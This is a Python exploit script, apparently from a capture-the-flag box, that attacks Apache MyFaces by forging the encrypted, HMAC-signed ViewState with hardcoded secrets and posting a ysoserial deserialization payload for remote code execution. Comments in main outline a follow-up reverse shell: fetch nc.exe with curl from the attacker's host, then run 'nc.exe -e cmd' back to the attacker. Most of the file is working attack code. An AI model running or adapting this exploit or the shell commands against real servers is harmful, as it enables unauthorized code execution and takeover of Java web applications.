#!/usr/bin/python3
import requests as req
import sys
from bs4 import BeautifulSoup
import base64
import urllib.parse
import re
from copy import copy
from Crypto.Cipher import DES
from io import StringIO
import hmac
import hashlib
from Crypto.Util.py3compat import *

#python implementation based on Java code: myfaces-core-assembly-1.2.12-src 

#these values were extracted from our mask.zip stuff from earlier
#<param-name>org.apache.myfaces.SECRET</param-name>
#<param-value>SnNGOTg3Ni0=</param-value>
#</context-param>
#    <context-param>
#        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
#        <param-value>HmacSHA1</param-value>
#     </context-param>
#<context-param>
#<param-name>org.apache.myfaces.MAC_SECRET</param-name>
#<param-value>SnNGOTg3Ni0=</param-value>
#DES
#ECB/PKCS5Padding
#from stateutils
#99      public static final String DEFAULT_ALGORITHM = "DES";
#100     public static final String DEFAULT_ALGORITHM_PARAMS = "ECB/PKCS5Padding";

__all__ = [ 'ValueError', 'pad', 'unpad' ]
url = 'http://10.10.10.130:8080/userSubscribe.faces'
myfacesSecret = 'SnNGOTg3Ni0='
myfacesMAC= 'SnNGOTg3Ni0='
myfacesAlgo = 'HmacSHA1'

#https://github.com/dlitz/pycrypto/blob/master/lib/Crypto/Util/Padding.py#L35
#for pkcs5 we can utilize pkcs7 padding and unpad helper functions
def pad(data_to_pad, block_size, style='pkcs7'):
    """Apply standard padding.
    :Parameters:
      data_to_pad : byte string
        The data that needs to be padded.
      block_size : integer
        The block boundary to use for padding. The output length is guaranteed
        to be a multiple of ``block_size``.
      style : string
        Padding algorithm. It can be *'pkcs7'* (default), *'iso7816'* or *'x923'*.
    :Return:
      The original data with the appropriate padding added at the end.
    """

    padding_len = block_size-len(data_to_pad)%block_size
    if style == 'pkcs7':
        padding = bchr(padding_len)*padding_len
    elif style == 'x923':
        padding = bchr(0)*(padding_len-1) + bchr(padding_len)
    elif style == 'iso7816':
        padding = bchr(128) + bchr(0)*(padding_len-1)
    else:
        raise ValueError("Unknown padding style")
    return data_to_pad + padding

def unpad(padded_data, block_size, style='pkcs7'):
    """Remove standard padding.
    :Parameters:
      padded_data : byte string
        A piece of data with padding that needs to be stripped.
      block_size : integer
        The block boundary to use for padding. The input length
        must be a multiple of ``block_size``.
      style : string
        Padding algorithm. It can be *'pkcs7'* (default), *'iso7816'* or *'x923'*.
    :Return:
        Data without padding.
    :Raises ValueError:
        if the padding is incorrect.
    """

    pdata_len = len(padded_data)
    if pdata_len % block_size:
        raise ValueError("Input data is not padded")
    if style in ('pkcs7', 'x923'):
        padding_len = bord(padded_data[-1])
        if padding_len<1 or padding_len>min(block_size, pdata_len):
            raise ValueError("Padding is incorrect.")
        if style == 'pkcs7':
            if padded_data[-padding_len:]!=bchr(padding_len)*padding_len:
                raise ValueError("PKCS#7 padding is incorrect.")
        else:
            if padded_data[-padding_len:-1]!=bchr(0)*(padding_len-1):
                raise ValueError("ANSI X.923 padding is incorrect.")
    elif style == 'iso7816':
        padding_len = pdata_len - padded_data.rfind(bchr(128))
        if padding_len<1 or padding_len>min(block_size, pdata_len):
            raise ValueError("Padding is incorrect.")
        if padding_len>1 and padded_data[1-padding_len:]!=bchr(0)*(padding_len-1):
            raise ValueError("ISO 7816-4 padding is incorrect.")
    else:
        raise ValueError("Unknown padding style")
    return padded_data[:-padding_len]

#this function generates our sha1 signature.. and it should be 160bits
def make_digest(message, key):
    
       
    digester = hmac.new(key, message, hashlib.sha1)
    #signature1 = digester.hexdigest()
    signature1 = digester.digest()
        #verify length is 20 bytes (160 bits)
    print(len(signature1)) 
       
    return signature1
    
      
"""decrypts the viewstate - this was mainly used to verify whether the server would accept our own 
viewstate after we have decrypted, then encrypted it again.. sanity check 
followed the algo specified in org.apache.myfaces.shared_impl_util.StateUtils.java"""
def decrypt_vs(data):
	# URL Encoding delimiter, this wasn't needed
	urldelim = "%"
	
	# Check to see if the viewstate data has urlencoded characters in it and remove
#	if re.search(urldelim,data):
#		d1 = urllib2.unquote(data).decode('utf8')
#	else:
	d1 = copy(data)
	d2 = base64.b64decode(d1)
	mackey = base64.b64decode(myfacesMAC)
	
	key = base64.b64decode(myfacesSecret)
	
	#setup DES encryption
	cipher = DES.new(key, DES.MODE_ECB)
	
	#signature = d2(
	#newdata = d2[:-len(result)]
	
	"""we need to separate our ciphertext and signature
	since we are using sha1, we want to remove the last 20 bytes (160 bits)
	from the b64.decoded viewstate 
	newdata represents the len(ciphertext-20) -- this should just be the ciphertext
	sig should be the last 20 bytes of the viewstate -- this should be the signature """
	newdata = d2[:-20]
	sig = d2[-20:]	
	print ("ctext is %s with length: %d" % (newdata,len(newdata)))
	print ("sig is %s with length: %d" % (sig,len(sig)))
	#print (len(data))

	#lets decrypt to plaintext
	plaintext = cipher.decrypt(newdata)
	print (plaintext)

	# Decompress data -- turns out gzip isnt used here for the viewstate
	#d4 = gzip.GzipFile(mode='rb', fileobj=d3)
	# Get data from gzip file object
	#d5 = d4.read()

	return plaintext

"""myFaces uses EtM from the stateutils.java code
this function encrypts the viewstate and returns b64(encrypted then signed viewstate)"""
def encrypt_vs(data):

	#b64decode the encryption key
	key = base64.b64decode(myfacesSecret)
	cipher = DES.new(key, DES.MODE_ECB)

	#encrypt the data
	ciphertext = cipher.encrypt(data)

	#b64decode the signing key
	mackey = base64.b64decode(myfacesMAC)

	#generate a signature	
	result = make_digest(ciphertext, mackey)
	
	#EtM is complete, append signature to end of ciphertext
	fullpayload= ciphertext + result

	#b64encode 
	b64EncodedFinal = base64.b64encode(fullpayload)
	
	#d2 = base64.b64decode(b64EncodedFinal)
	#newdata = d2[:-20]
	#sig = d2[-20:]	
#	print ("NEW ctext is %s with length: %d" % (newdata,len(newdata)))
#	print ("NEW sig is %s with length: %d" % (sig,len(sig)))
#	print ("final ciphertext is: %s"% b64EncodedFinal)
	
	return b64EncodedFinal

"""makes a request to the server containing our serialized payload
first it retrieves a valid cookie from the server
then it replaces the javax.faces.viewstate parameter with our happy payload generated out of band with ysoserial"""
def makeRequest(filename):
	r = req.get(url)
	soup = BeautifulSoup(r.text, 'html.parser')

	#retrieving the current viewstate in response, was for debugging
	viewstate = soup.find(id='javax.faces.ViewState')
	viewstateValue= viewstate['value']
	#print (viewstateValue)
	sessionCookie =  r.cookies

	with open(filename,"rb") as f:
		fileContent = f.read()
	
	#we pad our payload first, then EtM it	
	ciphertext = encrypt_vs(pad(fileContent,8))
		
	#our payload
	payload = {'j_id_jsp_1623871077_1:email':'test@test.com',
		'j_id_jsp_1623871077_1:submit':'SIGN UP',
		'j_id_jsp_1623871077_1_SUBMIT':'1',
		'javax.faces.ViewState': ciphertext}
	r2 = req.post(url,cookies=sessionCookie, data=payload)
	print (r2.text)
	
def main():
 	
	filename = sys.argv[1]
	
	#our file contents can contain yso payload 
	#CommonsCollections6 'cmd.exe /c ping -n 2 <ourip>'
	makeRequest(filename)
	
	"""we can listen in on 
	sudo tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo
	to see if our RCE worked correctly then create new payloads for a rev shell

	start nc listener
	start python http server
	e.g. curl -O http://<ip>/nc.exe; nc.exe -e cmd <ourip> <port>"""
	
	#print ("final payload b64(ciphertext) is: %s"% urllib.parse.quote(ciphertext))
	#ciphertext = encrypt_vs(plaintext)

	#print ("final original b64(ciphertext) is: %s"% urllib.parse.quote(ciphertext))
if __name__ == '__main__':
	sys.exit(main())
